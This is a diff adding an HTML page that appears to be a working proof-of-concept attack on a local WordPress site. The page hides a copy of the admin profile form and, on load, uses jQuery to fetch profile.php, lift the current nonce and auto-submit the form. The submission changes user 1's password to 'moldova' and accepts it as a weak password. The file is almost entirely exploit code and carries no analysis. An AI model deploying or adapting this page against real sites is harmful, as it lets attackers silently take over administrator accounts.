@@ -1,0 +1,504 @@
+<html>
+<head>
+<script src="http://localhost/wordpresslastmu/wp-includes/js/jquery/jquery.js?ver=3.7.1" id="jquery-core-js"></script>
+
+
+<script type="text/javascript">
+
+
+	
+	
+	jQuery(document).ready(function() {
+		
+		jQuery.get( 'http://localhost/wordpresslastmu/wp-admin/profile.php', function( data, status ) {
+			if ( status == 'success' ) {
+				console.log( 'working' );
+
+				var nonce_code_new = jQuery( data ).find( '#_wpnonce' ).val();
+				
+				jQuery( '#_wpnonce' ).val( nonce_code_new );
+				
+				
+				jQuery( '#alexandru' ).find( 'p.submit' ).children( 'input' ).click();
+
+			} else {
+				console.log( 'Getting URL data failed! (No internet connection?)' );
+			}
+		} );
+			
+
+	});
+	
+</script>
+
+</head>
+
+<body>
+
+<div id="alexandru" style="display: none;">
+
+<form id="your-profile" action="http://localhost/wordpresslastmu/wp-admin/profile.php" method="post" novalidate="novalidate">
+				<input type="hidden" id="_wpnonce" name="_wpnonce" value="1fd9320c57"><input type="hidden" name="_wp_http_referer" value="/wordpresslastmu/wp-admin/profile.php?wp_http_referer=%2Fwordpresslastmu%2Fwp-admin%2Fusers.php">									<input type="hidden" name="wp_http_referer" value="/wordpresslastmu/wp-admin/users.php">
+								<p>
+					<input type="hidden" name="from" value="profile">
+					<input type="hidden" name="checkuser_id" value="1">
+				</p>
+
+				<h2>Personal Options</h2>
+
+				<table class="form-table" role="presentation">
+											<tbody><tr class="user-rich-editing-wrap">
+							<th scope="row">Visual Editor</th>
+							<td>
+								<label for="rich_editing"><input name="rich_editing" type="checkbox" id="rich_editing" value="false">
+									Disable the visual editor when writing								</label>
+							</td>
+						</tr>
+					
+					
+										<tr class="user-syntax-highlighting-wrap">
+						<th scope="row">Syntax Highlighting</th>
+						<td>
+							<label for="syntax_highlighting"><input name="syntax_highlighting" type="checkbox" id="syntax_highlighting" value="false">
+								Disable syntax highlighting when editing code							</label>
+						</td>
+					</tr>
+					
+										<tr class="user-admin-color-wrap">
+						<th scope="row">Admin Color Scheme</th>
+						<td>
+								<fieldset id="color-picker" class="scheme-list">
+		<legend class="screen-reader-text"><span>
+			Admin Color Scheme		</span></legend>
+		<input type="hidden" id="color-nonce" name="color-nonce" value="13d3db4edf">			<div class="color-option selected">
+				<input name="admin_color" id="admin_color_fresh" type="radio" value="fresh" class="tog" checked="checked">
+				<input type="hidden" class="css_url" value="">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#a7aaad&quot;,&quot;focus&quot;:&quot;#72aee6&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_fresh">Default</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #1d2327">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #2c3338">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #2271b1">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #72aee6">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_light" type="radio" value="light" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/light/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#999&quot;,&quot;focus&quot;:&quot;#ccc&quot;,&quot;current&quot;:&quot;#ccc&quot;}}">
+				<label for="admin_color_light">Light</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #e5e5e5">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #999">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #d64e07">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #04a4cc">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_modern" type="radio" value="modern" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/modern/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f3f1f1&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_modern">Modern</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #1e1e1e">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #3858e9">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #33f078">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_blue" type="radio" value="blue" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/blue/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#e5f8ff&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_blue">Blue</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #096484">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #4796b3">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #52accc">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #74B6CE">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_coffee" type="radio" value="coffee" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/coffee/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f3f2f1&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_coffee">Coffee</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #46403c">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #59524c">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #c7a589">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #9ea476">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_ectoplasm" type="radio" value="ectoplasm" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/ectoplasm/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#ece6f6&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_ectoplasm">Ectoplasm</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #413256">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #523f6d">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #a3b745">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #d46f15">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_midnight" type="radio" value="midnight" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/midnight/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f1f2f3&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_midnight">Midnight</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #25282b">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #363b3f">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #69a8bb">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #e14d43">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_ocean" type="radio" value="ocean" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/ocean/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f2fcff&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_ocean">Ocean</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #627c83">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #738e96">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #9ebaa0">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #aa9d88">&nbsp;</div>
+									</div>
+			</div>
+						<div class="color-option ">
+				<input name="admin_color" id="admin_color_sunrise" type="radio" value="sunrise" class="tog">
+				<input type="hidden" class="css_url" value="http://localhost/wordpresslastmu/wp-admin/css/colors/sunrise/colors.css">
+				<input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f3f1f1&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
+				<label for="admin_color_sunrise">Sunrise</label>
+				<div class="color-palette">
+									<div class="color-palette-shade" style="background-color: #b43c38">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #cf4944">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #dd823b">&nbsp;</div>
+										<div class="color-palette-shade" style="background-color: #ccaf0b">&nbsp;</div>
+									</div>
+			</div>
+				</fieldset>
+							</td>
+					</tr>
+					
+										<tr class="user-comment-shortcuts-wrap">
+						<th scope="row">Keyboard Shortcuts</th>
+						<td>
+							<label for="comment_shortcuts">
+								<input type="checkbox" name="comment_shortcuts" id="comment_shortcuts" value="true">
+								Enable keyboard shortcuts for comment moderation.							</label>
+							<a href="https://wordpress.org/documentation/article/keyboard-shortcuts-classic-editor/#keyboard-shortcuts-for-comments">Documentation on Keyboard Shortcuts</a>						</td>
+					</tr>
+					
+					<tr class="show-admin-bar user-admin-bar-front-wrap">
+						<th scope="row">Toolbar</th>
+						<td>
+							<label for="admin_bar_front">
+								<input name="admin_bar_front" type="checkbox" id="admin_bar_front" value="1" checked="checked">
+								Show Toolbar when viewing site							</label><br>
+						</td>
+					</tr>
+
+															<tr class="user-language-wrap">
+						<th scope="row">
+														<label for="locale">Language<span class="dashicons dashicons-translation" aria-hidden="true"></span></label>
+						</th>
+						<td>
+							<select name="locale" id="locale"><optgroup label="Installed">
+<option value="site-default" data-installed="1" selected="selected">Site Default</option>
+<option value="" lang="en" data-installed="1">English (United States)</option>
+</optgroup>
+<optgroup label="Available">
+<option value="af" lang="af">Afrikaans</option>
+<option value="am" lang="am">አማርኛ</option>
+<option value="arg" lang="an">Aragonés</option>
+<option value="ar" lang="ar">العربية</option>
+<option value="ary" lang="ar">العربية المغربية</option>
+<option value="as" lang="as">অসমীয়া</option>
+<option value="azb" lang="az">گؤنئی آذربایجان</option>
+<option value="az" lang="az">Azərbaycan dili</option>
+<option value="bel" lang="be">Беларуская мова</option>
+<option value="bg_BG" lang="bg">Български</option>
+<option value="bn_BD" lang="bn">বাংলা</option>
+<option value="bo" lang="bo">བོད་ཡིག</option>
+<option value="bs_BA" lang="bs">Bosanski</option>
+<option value="ca" lang="ca">Català</option>
+<option value="ceb" lang="ceb">Cebuano</option>
+<option value="cs_CZ" lang="cs">Čeština</option>
+<option value="cy" lang="cy">Cymraeg</option>
+<option value="da_DK" lang="da">Dansk</option>
+<option value="de_AT" lang="de">Deutsch (Österreich)</option>
+<option value="de_DE" lang="de">Deutsch</option>
+<option value="de_DE_formal" lang="de">Deutsch (Sie)</option>
+<option value="de_CH" lang="de">Deutsch (Schweiz)</option>
+<option value="de_CH_informal" lang="de">Deutsch (Schweiz, Du)</option>
+<option value="dsb" lang="dsb">Dolnoserbšćina</option>
+<option value="dzo" lang="dz">རྫོང་ཁ</option>
+<option value="el" lang="el">Ελληνικά</option>
+<option value="en_GB" lang="en">English (UK)</option>
+<option value="en_CA" lang="en">English (Canada)</option>
+<option value="en_AU" lang="en">English (Australia)</option>
+<option value="en_ZA" lang="en">English (South Africa)</option>
+<option value="en_NZ" lang="en">English (New Zealand)</option>
+<option value="eo" lang="eo">Esperanto</option>
+<option value="es_AR" lang="es">Español de Argentina</option>
+<option value="es_CL" lang="es">Español de Chile</option>
+<option value="es_VE" lang="es">Español de Venezuela</option>
+<option value="es_CR" lang="es">Español de Costa Rica</option>
+<option value="es_EC" lang="es">Español de Ecuador</option>
+<option value="es_PE" lang="es">Español de Perú</option>
+<option value="es_DO" lang="es">Español de República Dominicana</option>
+<option value="es_UY" lang="es">Español de Uruguay</option>
+<option value="es_PR" lang="es">Español de Puerto Rico</option>
+<option value="es_MX" lang="es">Español de México</option>
+<option value="es_GT" lang="es">Español de Guatemala</option>
+<option value="es_ES" lang="es">Español</option>
+<option value="es_CO" lang="es">Español de Colombia</option>
+<option value="et" lang="et">Eesti</option>
+<option value="eu" lang="eu">Euskara</option>
+<option value="fa_AF" lang="fa">(فارسی (افغانستان</option>
+<option value="fa_IR" lang="fa">فارسی</option>
+<option value="fi" lang="fi">Suomi</option>
+<option value="fr_BE" lang="fr">Français de Belgique</option>
+<option value="fr_CA" lang="fr">Français du Canada</option>
+<option value="fr_FR" lang="fr">Français</option>
+<option value="fur" lang="fur">Friulian</option>
+<option value="fy" lang="fy">Frysk</option>
+<option value="gd" lang="gd">Gàidhlig</option>
+<option value="gl_ES" lang="gl">Galego</option>
+<option value="gu" lang="gu">ગુજરાતી</option>
+<option value="haz" lang="haz">هزاره گی</option>
+<option value="he_IL" lang="he">עִבְרִית</option>
+<option value="hi_IN" lang="hi">हिन्दी</option>
+<option value="hr" lang="hr">Hrvatski</option>
+<option value="hsb" lang="hsb">Hornjoserbšćina</option>
+<option value="hu_HU" lang="hu">Magyar</option>
+<option value="hy" lang="hy">Հայերեն</option>
+<option value="id_ID" lang="id">Bahasa Indonesia</option>
+<option value="is_IS" lang="is">Íslenska</option>
+<option value="it_IT" lang="it">Italiano</option>
+<option value="ja" lang="ja">日本語</option>
+<option value="jv_ID" lang="jv">Basa Jawa</option>
+<option value="ka_GE" lang="ka">ქართული</option>
+<option value="kab" lang="kab">Taqbaylit</option>
+<option value="kk" lang="kk">Қазақ тілі</option>
+<option value="km" lang="km">ភាសាខ្មែរ</option>
+<option value="kn" lang="kn">ಕನ್ನಡ</option>
+<option value="ko_KR" lang="ko">한국어</option>
+<option value="ckb" lang="ku">كوردی&lrm;</option>
+<option value="kir" lang="ky">Кыргызча</option>
+<option value="lo" lang="lo">ພາສາລາວ</option>
+<option value="lt_LT" lang="lt">Lietuvių kalba</option>
+<option value="lv" lang="lv">Latviešu valoda</option>
+<option value="mk_MK" lang="mk">Македонски јазик</option>
+<option value="ml_IN" lang="ml">മലയാളം</option>
+<option value="mn" lang="mn">Монгол</option>
+<option value="mr" lang="mr">मराठी</option>
+<option value="ms_MY" lang="ms">Bahasa Melayu</option>
+<option value="my_MM" lang="my">ဗမာစာ</option>
+<option value="nb_NO" lang="nb">Norsk bokmål</option>
+<option value="ne_NP" lang="ne">नेपाली</option>
+<option value="nl_NL" lang="nl">Nederlands</option>
+<option value="nl_BE" lang="nl">Nederlands (België)</option>
+<option value="nl_NL_formal" lang="nl">Nederlands (Formeel)</option>
+<option value="nn_NO" lang="nn">Norsk nynorsk</option>
+<option value="oci" lang="oc">Occitan</option>
+<option value="pa_IN" lang="pa">ਪੰਜਾਬੀ</option>
+<option value="pl_PL" lang="pl">Polski</option>
+<option value="ps" lang="ps">پښتو</option>
+<option value="pt_PT_ao90" lang="pt">Português (AO90)</option>
+<option value="pt_BR" lang="pt">Português do Brasil</option>
+<option value="pt_PT" lang="pt">Português</option>
+<option value="pt_AO" lang="pt">Português de Angola</option>
+<option value="rhg" lang="rhg">Ruáinga</option>
+<option value="ro_RO" lang="ro">Română</option>
+<option value="ru_RU" lang="ru">Русский</option>
+<option value="sah" lang="sah">Сахалыы</option>
+<option value="snd" lang="sd">سنڌي</option>
+<option value="si_LK" lang="si">සිංහල</option>
+<option value="sk_SK" lang="sk">Slovenčina</option>
+<option value="skr" lang="skr">سرائیکی</option>
+<option value="sl_SI" lang="sl">Slovenščina</option>
+<option value="sq" lang="sq">Shqip</option>
+<option value="sr_RS" lang="sr">Српски језик</option>
+<option value="sv_SE" lang="sv">Svenska</option>
+<option value="sw" lang="sw">Kiswahili</option>
+<option value="szl" lang="szl">Ślōnskŏ gŏdka</option>
+<option value="ta_IN" lang="ta">தமிழ்</option>
+<option value="ta_LK" lang="ta">தமிழ்</option>
+<option value="te" lang="te">తెలుగు</option>
+<option value="th" lang="th">ไทย</option>
+<option value="tl" lang="tl">Tagalog</option>
+<option value="tr_TR" lang="tr">Türkçe</option>
+<option value="tt_RU" lang="tt">Татар теле</option>
+<option value="tah" lang="ty">Reo Tahiti</option>
+<option value="ug_CN" lang="ug">ئۇيغۇرچە</option>
+<option value="uk" lang="uk">Українська</option>
+<option value="ur" lang="ur">اردو</option>
+<option value="uz_UZ" lang="uz">O‘zbekcha</option>
+<option value="vi" lang="vi">Tiếng Việt</option>
+<option value="zh_TW" lang="zh">繁體中文</option>
+<option value="zh_CN" lang="zh">简体中文</option>
+<option value="zh_HK" lang="zh">香港中文</option>
+</optgroup></select>						</td>
+					</tr>
+					
+					
+				</tbody></table>
+				
+				<h2>Name</h2>
+
+				<table class="form-table" role="presentation">
+					<tbody><tr class="user-user-login-wrap">
+						<th><label for="user_login">Username</label></th>
+						<td><input type="text" name="user_login" id="user_login" value="1" disabled="disabled" class="regular-text"> <span class="description">Usernames cannot be changed.</span></td>
+					</tr>
+
+					
+					
+					<tr class="user-first-name-wrap">
+						<th><label for="first_name">First Name</label></th>
+						<td><input type="text" name="first_name" id="first_name" value="" class="regular-text"></td>
+					</tr>
+
+					<tr class="user-last-name-wrap">
+						<th><label for="last_name">Last Name</label></th>
+						<td><input type="text" name="last_name" id="last_name" value="" class="regular-text"></td>
+					</tr>
+
+					<tr class="user-nickname-wrap">
+						<th><label for="nickname">Nickname <span class="description">(required)</span></label></th>
+						<td><input type="text" name="nickname" id="nickname" value="1" class="regular-text"></td>
+					</tr>
+
+					<tr class="user-display-name-wrap">
+						<th>
+							<label for="display_name">Display name publicly as</label>
+						</th>
+						<td>
+							<select name="display_name" id="display_name">
+																									<option selected="selected">1</option>
+															</select>
+						</td>
+					</tr>
+				</tbody></table>
+
+				<h2>Contact Info</h2>
+
+				<table class="form-table" role="presentation">
+					<tbody><tr class="user-email-wrap">
+						<th><label for="email">Email <span class="description">(required)</span></label></th>
+						<td>
+							<input type="email" name="email" id="email" aria-describedby="email-description" value="1@1.com" class="regular-text ltr">
+															<p class="description" id="email-description">
+									If you change this, an email will be sent at your new address to confirm it. <strong>The new address will not become active until confirmed.</strong>								</p>
+							
+													</td>
+					</tr>
+
+					<tr class="user-url-wrap">
+						<th><label for="url">Website</label></th>
+						<td><input type="url" name="url" id="url" value="http://localhost/wordpresslastmu" class="regular-text code"></td>
+					</tr>
+
+									</tbody></table>
+
+				<h2>About Yourself</h2>
+
+				<table class="form-table" role="presentation">
+					<tbody><tr class="user-description-wrap">
+						<th><label for="description">Biographical Info</label></th>
+						<td><textarea name="description" id="description" rows="5" cols="30"></textarea>
+						<p class="description">Share a little biographical information to fill out your profile. This may be shown publicly.</p></td>
+					</tr>
+
+											<tr class="user-profile-picture">
+							<th>Profile Picture</th>
+							<td>
+								<img alt="" src="http://1.gravatar.com/avatar/d219af79b45e5891507fda4c4c2139a0?s=96&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/d219af79b45e5891507fda4c4c2139a0?s=192&amp;d=mm&amp;r=g 2x" class="avatar avatar-96 photo" height="96" width="96" loading="lazy" decoding="async">								<p class="description">
+									<a href="https://en.gravatar.com/">You can change your profile picture on Gravatar</a>.								</p>
+							</td>
+						</tr>
+																					</tbody></table>
+
+						<h2>Account Management</h2>
+
+						<table class="form-table" role="presentation">
+							<tbody><tr id="password" class="user-pass1-wrap">
+								<th><label for="pass1">New Password</label></th>
+								<td>
+									<input type="hidden" value=" "><!-- #24364 workaround -->
+									<button type="button" class="button wp-generate-pw hide-if-no-js" aria-expanded="true">Set New Password</button>
+									<div class="wp-pwd hide-if-js is-open" style="display: block;">
+										<div class="password-input-wrapper">
+											<input type="text" name="pass1" id="pass1" class="regular-text empty short" value="moldova" autocomplete="new-password" spellcheck="false" data-pw="&amp;)dPJ1tx51N^%rj)UxReH((W" aria-describedby="pass-strength-result">
+											<div style="" id="pass-strength-result" aria-live="polite" class="short">Very weak</div>
+										</div>
+										<button type="button" class="button wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Hide password">
+											<span class="dashicons dashicons-hidden" aria-hidden="true"></span>
+											<span class="text">Hide</span>
+										</button>
+										<button type="button" class="button wp-cancel-pw hide-if-no-js" data-toggle="0" aria-label="Cancel password change">
+											<span class="dashicons dashicons-no" aria-hidden="true"></span>
+											<span class="text">Cancel</span>
+										</button>
+									</div>
+								</td>
+							</tr>
+							<tr class="user-pass2-wrap hide-if-js">
+								<th scope="row"><label for="pass2">Repeat New Password</label></th>
+								<td>
+								<input type="password" name="pass2" id="pass2" class="regular-text" value="moldova" autocomplete="new-password" spellcheck="false" aria-describedby="pass2-desc">
+																			<p class="description" id="pass2-desc">Type your new password again.</p>
+																	</td>
+							</tr>
+							<tr class="pw-weak" style="display: table-row;">
+								<th>Confirm Password</th>
+								<td>
+									<label>
+										<input type="checkbox" name="pw_weak" checked class="pw-checkbox">
+										<span id="pw-weak-text-label">Confirm use of weak password</span>
+									</label>
+								</td>
+							</tr>
+							
+														
+															<tr class="user-sessions-wrap hide-if-no-js">
+									<th>Sessions</th>
+									<td aria-live="assertive">
+										<div class="destroy-sessions"><button type="button" class="button" id="destroy-sessions">Log Out Everywhere Else</button></div>
+										<p class="description">
+											Did you lose your phone or leave your account logged in at a public computer? You can log out everywhere else, and stay logged in here.										</p>
+									</td>
+								</tr>
+													</tbody></table>
+
+											<div class="application-passwords hide-if-no-js" id="application-passwords-section">
+							<h2>Application Passwords</h2>
+							<p>Application passwords allow authentication via non-interactive systems, such as XML-RPC or the REST API, without providing your actual password. Application passwords can be easily revoked. They cannot be used for traditional logins to your website.</p>
+															<p>The application password feature requires HTTPS, which is not enabled on this site.</p>
+								<p>
+									If this is a development website you can <a href="https://developer.wordpress.org/apis/wp-config-php/#wp-environment-type" target="_blank">set the environment type accordingly</a> to enable application passwords.								</p>
+													</div>
+					
+					
+					
+									<h2>Additional Capabilities</h2>
+
+					<table class="form-table" role="presentation">
+						<tbody><tr class="user-capabilities-wrap">
+							<th scope="row">Capabilities</th>
+							<td>
+								bbp_keymaster							</td>
+						</tr>
+					</tbody></table>
+				
+				<input type="hidden" name="action" value="update">
+				<input type="hidden" name="user_id" id="user_id" value="1">
+
+				<p class="submit"><input type="submit" name="submit" id="submit" class="button button-primary" value="Update Profile"></p>
+			</form>
+</div>
+
+</body>
+</html>
